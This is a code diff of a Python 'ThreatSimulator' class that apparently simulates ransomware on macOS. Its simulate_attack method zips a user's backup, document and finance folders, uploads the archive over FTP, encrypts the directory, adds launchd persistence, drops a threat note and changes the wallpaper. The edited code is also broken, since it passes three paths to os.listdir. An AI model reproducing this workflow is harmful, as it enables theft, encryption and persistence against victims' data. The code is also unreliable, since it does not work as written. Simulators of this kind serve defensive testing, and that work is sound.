@@ -135,22 +135,22 @@ class ThreatSimulator:
                 pass
     check_and_install_requests = staticmethod(check_and_install_requests)
 
-    def zip_files(self, documentos_folder):
+    def zip_files(self, backup, documentos, financeiro):
         from datetime import datetime
 
         current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
         zip_filename = f"data_{current_time}.zip"
-        zip_filepath = os.path.join(documentos_folder, zip_filename)
+        zip_filepath = os.path.join(backup, documentos, financeiro, zip_filename)
 
         total_size_before = sum(
-            os.path.getsize(os.path.join(documentos_folder, f))
-            for f in os.listdir(documentos_folder)
-            if os.path.isfile(os.path.join(documentos_folder, f)) and not f.endswith('.zip')
+            os.path.getsize(os.path.join(backup, documentos, financeiro, f))
+            for f in os.listdir(backup, documentos, financeiro)
+            if os.path.isfile(os.path.join(backup, documentos, financeiro, f)) and not f.endswith('.zip')
         )
 
         with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for file in os.listdir(documentos_folder):
-                file_path = os.path.join(documentos_folder, file)
+            for file in os.listdir(backup, documentos, financeiro):
+                file_path = os.path.join(backup, documentos, financeiro, file)
                 if (
                     os.path.isfile(file_path)
                     and not file.startswith('.')
@@ -173,9 +173,9 @@ class ThreatSimulator:
             os.remove(file_path)
 
     def simulate_attack(self):
-        zip_file_path = self.zip_files(self.documentos_folder)
+        zip_file_path = self.zip_files(self.backup, self.documentos, self.financeiro)
         self.upload_via_ftp(zip_file_path)
-        self.encrypt_directory(self.documentos_folder, self.extension)
+        self.encrypt_directory(self.backup, self.documentos, self.financeiro, self.extension)
         self.add_launchd_persistence()
         self.create_threat_note()
         self.set_wallpaper_from_url("https://academy.avast.com/hs-fs/hubfs/New_Avast_Academy/the_essential_guide_to_ransomware_academy_refresh_2/img-01.png?width=788&height=409&name=img-01.png")
